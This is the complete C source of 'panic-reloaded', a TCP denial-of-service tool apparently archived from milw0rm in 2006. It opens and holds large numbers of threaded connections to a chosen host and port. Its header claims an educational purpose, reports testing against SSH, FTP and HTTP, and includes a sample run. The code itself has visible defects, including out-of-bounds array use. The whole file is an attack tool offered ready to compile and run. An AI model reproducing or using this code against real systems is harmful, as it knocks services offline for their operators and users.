<html><head><title>panic-reloaded TCP Denial of Service Tool</title></head><pre>/* -----------------------------------------------------------------------------
 *  ______________________________             __________
 *  __  ____/_  __ \__  __/__  __/_____ ____  ____  /_  /_
 *  _  / __ _  / / /_  /  __  /_ _  __  /  / / /_  /_  __/
 *  / /_/ / / /_/ /_  /   _  __/ / /_/ // /_/ /_  / / /_
 *  \____/  \____/ /_/    /_/    \__,_/ \__,_/ /_/  \__/
 *                                   Security Community
 *
 * -----------------------------------------------------------------------------
 * 
 * Software for educational purposes
 * 
 * panic-reloaded.c written by hash &lt;hash AT gotfault DOT net&gt;
 *			            &lt;www.gotfault.net&gt;
 *
 * Description: TCP Denial Of Service Tool. panic-reloaded does
 * 		not require large link or fast internet connection,
 * 		it creates many pthreads, leaving openned connections
 * 		to victim host. It is fast and an efficient way to
 * 		deny a TCP service.
 *
 * 		Tested against SSH, FTP, HTTP.
 * 
 * TTY1:
 * hash@scarface:~$ gcc -lpthread panic-reloaded.c -o panic-reloaded -Wall
 * hash@scarface:~$ ./panic-reloaded3 10.10.10.2 22 20 100 10
 * panic-reloaded.c
 * written by hash &lt;http://gotfault.net&gt;
 * [!] Target: localhost:443
 * [!] Threads: 20 for each round
 * [*] Countdown: 40 | [!] Sleeping: 10s
 *
 * TTY2:
 * hash@scarface:~$ ssh localhost 
 * ssh_exchange_identification: Connection closed by remote host
 * hash@scarface:~$
 *
 * 
 * Greets to folks from gotfault, rfdslabs, tripbit 
 * and to friends out there.
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;netdb.h&gt;
#include &lt;pthread.h&gt;

#define	AUTHOR		&quot;written by hash &lt;http://gotfault.net&gt;&quot;

void usage(char*);
void sockz(void*);
void header();
void close_func(void *); 
char *resolver(char*);

struct pthread_args {

	char *host_pthread;
	char *port_pthread;
	char *slp_pthread;

};struct pthread_args thread_data_array[1];

struct pthread_close {
	
	char *slp_pthread;
	int sock_pointer;
	
};struct pthread_close thread_data[0];

void usage(char *progname) {

	header();
	printf(&quot;Use: %s host port threads rounds sleep_time\n&quot;,progname);
	printf(&quot;host:		ip address or hostname\n&quot;);
	printf(&quot;port:		victim port\n&quot;);
	printf(&quot;threads:	number of threads\n&quot;);
	printf(&quot;rounds:		number of reloads, min 40\n&quot;);
	printf(&quot;sleep_time:	sleep time between each round\n&quot;);
	exit(0);

}

void header() {
	
	printf(&quot;panic-reloaded.c\n&quot;);
	printf(&quot;%s\n&quot;,AUTHOR);
	
}

void close_func(void *c) {

	struct pthread_close *my_close;
	
	char *slp_tmp;
	int slp,
	    err,
	    sock_p;
	
	my_close = (struct pthread_close *) c;
	slp_tmp = my_close-&gt;slp_pthread;
	sock_p = my_close-&gt;sock_pointer;

	slp = atoi(slp_tmp);

	sleep(slp+1);

	if((err = close(sock_p)) &lt; 0) {
		printf(&quot;close_func: Can`t close socket\n&quot;);
		exit(-1);
	}
		
	
}

void sockz(void *t) {

        struct sockaddr_in dest;
	struct pthread_args *my_data;
	pthread_t close_them_all;
	
	char *h,
	     *p_tmp,
	     *slp_tmp;

	int p,
	    con,
	    err,
	    desc,
	    slp;

	my_data = (struct pthread_args *) t;

	h = my_data-&gt;host_pthread;
	p_tmp = my_data-&gt;port_pthread;
	slp_tmp = my_data-&gt;slp_pthread;

	p = atoi(p_tmp);
	slp = atoi(slp_tmp);

        desc = socket(AF_INET,SOCK_STREAM,0);
       
	if((desc = socket(AF_INET,SOCK_STREAM,0)) &lt; 0) {
                perror(&quot;sockz: Can`t create socket\n&quot;);
                exit(-1);
        }

        dest.sin_family = AF_INET;
        dest.sin_port = htons(p);
        dest.sin_addr.s_addr = inet_addr(h);
        bzero(&amp;(dest.sin_zero),8);

       	con = connect(desc,(struct sockaddr *)&amp;dest,sizeof(dest));
       
	if(con &lt; 0) {
               	printf(&quot;\nsockz: Can`t connect to %s:%d\n&quot;,h,p);
               	close(desc);
               	exit(-1);
       	}

	thread_data[0].sock_pointer = desc;
	thread_data[0].slp_pthread = slp_tmp;

	if((err = pthread_create(&amp;close_them_all,NULL,(void*)&amp;close_func,\
	(void*)&amp;thread_data[0]) == -1)) {
		printf(&quot;sockz: Can`t create thread\n&quot;);
		exit(-1);
	}

}

char *resolver(char *hosttmp){

        struct hostent *h;

        char *host;

        h = gethostbyname(hosttmp);
        
	if(!h) {
                printf(&quot;resolver: Can`t resolve hostname %s\n&quot;,hosttmp);
                exit(-1);
        }

        host = inet_ntoa(*((struct in_addr *)h-&gt;h_addr_list[0]));

        return host;
}


int main(int ac, char **av) {
		
	if(ac&lt;6)
		usage(av[0]);

	int x,
	    y,
	    z,
	    err;
	
	char *hosttmp,
	     *port,
	     *host,
	     *slp;
	
	int sockets,
	    rounds,
	    slptime,
	    countdown; 
	
	hosttmp = av[1];
	port = av[2];
	sockets = atoi(av[3]);
	rounds = atoi(av[4]); countdown = rounds;
	slp = av[5];
	slptime = atoi(slp);

	if(rounds&lt;40)	
		usage(av[0]);

	host = resolver(hosttmp);

	pthread_t threads[rounds];

	header();
	
	printf(&quot;[!] Target: %s:%s\n&quot;,host,port);
	printf(&quot;[!] Threads: %d for each round\n&quot;,sockets);

	for(z=0;z&lt;rounds;z++) {	
		for(x=0;x&lt;sockets;x++) {
			thread_data_array[x].host_pthread = host;
			thread_data_array[x].port_pthread = port;
			thread_data_array[x].slp_pthread = slp;

			if((err = pthread_create(&amp;threads[x],NULL,(void*)&amp;sockz,\
			(void*)&amp;thread_data_array[x])) == -1){
				printf(&quot;main: Can`t create thread\n&quot;);
				exit(-1);
			}

			for(y=0;y&lt;sockets;y++)
			pthread_join(threads[y],NULL);
	
		}
		printf(&quot;[*] Countdown: %d | [!] Sleeping: %ds\n&quot;,countdown--,slptime);
		sleep(slptime);
	}
	printf(&quot;Done!\n&quot;);	
	
	return 0;
}
/*oef*/

// milw0rm.com [2006-04-13]</pre></html>